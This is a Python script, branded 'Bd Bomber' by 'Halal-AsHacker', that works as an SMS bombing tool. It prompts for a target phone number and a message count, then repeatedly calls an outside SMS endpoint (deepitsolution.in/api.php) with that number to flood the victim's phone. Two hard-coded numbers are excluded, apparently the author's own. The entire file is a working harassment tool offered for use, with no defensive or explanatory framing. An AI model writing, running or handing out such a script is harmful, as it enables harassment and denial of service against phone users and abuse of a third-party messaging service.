#!/usr/bin/env python
import requests
import os
import time
banner2='''
 ___      ___                   
| o ) || | o ) _   _ _ ||  _  _ 
| o \/o| | o \/o\|/ \ \|o\/o\/_|
|___/\_| |___/\_/L_n_n||_/\( L| 
                               ➤   
'''
phone_number=['01618609573','01974162244']
banner3='''Art by Donovan Bake
           ___
     |     | |
    / \    | |
   |--s|===|-|
   |---|   |w|
  /     \  |o|
 | b     | |w|
 | o     |=|-|
 | m     | | |
 |_______| |_|
  |@| |@|  | |
___________|_|_                                        
'''

os.system('clear')
print('\033[1;32;40m', ' _________________________________________')
print('\033[1;32;40m','/        ☯\033[1;36;40mWelcome The Halal-AsHacker\033[1;32;40m☯     \\')
print('\033[1;32;40m','|', '\033[1;33;40m                                       \033[0m', '|')
print('\033[1;32;40m','|', '\033[1;33;40m             HELLO Hackers!            \033[0m', '|')
print('\033[1;32;40m','|', '\033[1;33;40m                                       \033[0m', '|')
print('\033[1;32;40m','|', '\033[1;35;40m           Let\'s get started!          \033[0m', '|')
print('\033[1;32;40m','|', '\033[1;33;40m                                       \033[0m', '|')
print('\033[1;32;40m','|', '\033[1;34;40m             Version 1.0 ➤             \033[0m', '|')
print('\033[1;32;40m',' \________________________________________/')
print("1) start bd bomber")
print("2) exit")
y=int(input("=>"))
if y==1:
    os.system('clear')
    print(banner2)
    n =str(input("Enter Your Target Number: "))
    a = int(input("Enter Your Amount: "))
    if n in phone_number:
        print('Tray another number.')
        time.sleep(2)

    else:
        os.system('clear')
        print(banner3)
        print('--------------------------------------------------------------------------------------------------------------------------------------')
        print('Tanget number is ',n)
        print('Amount is ',a)
        print('wait..................')
        for x in range(a):

          response = requests.get("http://deepitsolution.in/api.php?number=" + n)
          if response.ok:
              print(f"message {x+1} send successful.....")
          else:
              print(f"message {x+1} failed......")
elif y == 2:
    print('Exiting...')
    import sys
    sys.exit()
else:
    print('Invalid option.')

print('Thank you for using Bd Bomber.') 
